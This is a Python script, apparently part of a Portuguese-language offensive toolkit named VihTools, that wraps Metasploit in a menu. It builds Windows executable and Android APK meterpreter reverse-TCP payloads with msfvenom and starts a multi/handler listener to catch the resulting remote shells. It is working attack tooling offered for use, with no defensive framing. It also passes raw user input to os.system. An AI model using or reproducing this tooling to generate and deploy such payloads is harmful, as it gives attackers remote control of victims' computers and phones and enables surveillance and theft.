#METASPLOIT
import os
from colorama import Fore, Style
import time
import subprocess
texto_vihtools = r"""
 ██▒   █▓ ██▓ ██░ ██ ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
▓██░   █▒▓██▒▓██░ ██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒     ▒██    ▒ 
 ▓██  █▒░▒██▒▒██▀▀██░▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░     ░ ▓██▄   
  ▒██ █░░░██░░▓█ ░██ ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░       ▒   ██▒
   ▒▀█░  ░██░░▓█▒░██▓  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
   ░ ▐░  ░▓   ▒ ░░▒░▒  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
   ░ ░░   ▒ ░ ▒ ░▒░ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
     ░░   ▒ ░ ░  ░░ ░  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
      ░   ░   ░  ░  ░             ░ ░      ░ ░      ░  ░      ░  
"""
def metasploit():
    os.system('clear')
    print(Fore.RED + texto_vihtools + Style.RESET_ALL)

    print(Fore.WHITE + "Exploração de Vulnerabilidades - Metasploit" + Style.RESET_ALL)
    print(Fore.WHITE + "Recursos do Metasploit:" + Style.RESET_ALL)
    print(Fore.WHITE + "[1] Gerar payloads para Windows" + Style.RESET_ALL)
    print(Fore.WHITE + "[2] Gerar payloads para Android" + Style.RESET_ALL)
    print(Fore.WHITE + "[3] Iniciar Metasploit Framework" + Style.RESET_ALL)
    print(Fore.WHITE + "[4] Voltar" + Style.RESET_ALL)

    user_metasploit = input(Fore.RED + "Digite o número do recurso que deseja utilizar: " + Style.RESET_ALL)

    def gerar_payloads_windows():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)
        print(Fore.WHITE + "Gerar Payloads para Windows" + Style.RESET_ALL)
        lhost = input(Fore.RED + "Digite o LHOST (seu IP): " + Style.RESET_ALL)
        lport = input(Fore.RED + "Digite a LPORT (porta de escuta): " + Style.RESET_ALL)
        nome_payload = input(Fore.RED + "Digite o nome do arquivo de saída (ex: payload.exe): " + Style.RESET_ALL)
        comando = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {nome_payload}"
        os.system(comando)
        print(Fore.WHITE + f"Payload gerado com sucesso: {nome_payload}" + Style.RESET_ALL)

        user_payload_metasploit_windows = input(Fore.RED + "Deseja fazer o exploit do payload gerado? (s/n): " + Style.RESET_ALL)
        if user_payload_metasploit_windows == 's':
            comando_payload_msfconsole = f"""
            use exploit/multi/handler;
            set payload windows/meterpreter/reverse_tcp;
            set LHOST {lhost};
            set LPORT {lport};
            run;
            exit
            """

            subprocess.run(["msfconsole", "-q", "-x", comando_payload_msfconsole])

        elif user_payload_metasploit_windows == 'n':
            print(Fore.WHITE + "OK!" + Style.RESET_ALL)

        user_menu = input(Fore.RED + "Deseja voltar ao menu do Metasploit? (s/n): " + Style.RESET_ALL)
        if user_menu.lower() == 's':
            metasploit()
        else:
            print(Fore.RED + "Saindo do Metasploit..." + Style.RESET_ALL)
            os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')

        

    def gerar_payloads_android():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)
        print(Fore.WHITE + "Gerar Payloads para Android" + Style.RESET_ALL)
        lhost = input(Fore.RED + "Digite o LHOST (seu IP): " + Style.RESET_ALL)
        lport = input(Fore.RED + "Digite a LPORT (porta de escuta): " + Style.RESET_ALL)
        nome_payload = input(Fore.RED + "Digite o nome do arquivo de saída (ex: payload.apk): " + Style.RESET_ALL)
        comando = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {nome_payload}"
        os.system(comando)
        print(Fore.WHITE + f"Payload gerado com sucesso: {nome_payload}" + Style.RESET_ALL)

        user_payload_metasploit_android = input(Fore.RED + "Deseja fazer o exploit do payload gerado? (s/n): " + Style.RESET_ALL)
        if user_payload_metasploit_android == 's':
            comando_payload_msfconsole = f"""
            use exploit/multi/handler;
            set payload android/meterpreter/reverse_tcp;
            set LHOST {lhost};
            set LPORT {lport};
            run;
            exit
            """

            subprocess.run(["msfconsole", "-q", "-x", comando_payload_msfconsole])
        elif user_payload_metasploit_android == 'n':
            print(Fore.WHITE + "OK!" + Style.RESET_ALL)     
        
        user_menu = input(Fore.RED + "Deseja voltar ao menu principal? (s/n): " + Style.RESET_ALL)
        if user_menu.lower() == 's':
            metasploit()
        else:
            print(Fore.RED + "Saindo do Metasploit..." + Style.RESET_ALL)
            os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')

    def iniciar_metasploit():
        os.system('clear')
        print(Fore.RED + texto_vihtools + Style.RESET_ALL)
        print(Fore.WHITE + "Iniciar Metasploit Framework" + Style.RESET_ALL)
        os.system('msfconsole')

        user_menu = input(Fore.RED + "Deseja voltar ao menu principal? (s/n): " + Style.RESET_ALL)
        if user_menu.lower() == 's':
            metasploit()
        else:
            print(Fore.RED + "Saindo do Metasploit..." + Style.RESET_ALL)
            os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')


    if user_metasploit == '1':
        gerar_payloads_windows()
    elif user_metasploit == '2':
        gerar_payloads_android()
    elif user_metasploit == '3':
        iniciar_metasploit()
    elif user_metasploit == '4':
        print(Fore.RED + "Voltando ao menu principal..." + Style.RESET_ALL)
        time.sleep(1)
        os.system('python3 recursos/ferramenta/MENU\ PRINCIPAL/menuprincipal.py')
    else:
        print(Fore.RED + "Opção inválida. Voltando ao menu do Metasploit..." + Style.RESET_ALL)
        metasploit()


    


metasploit()

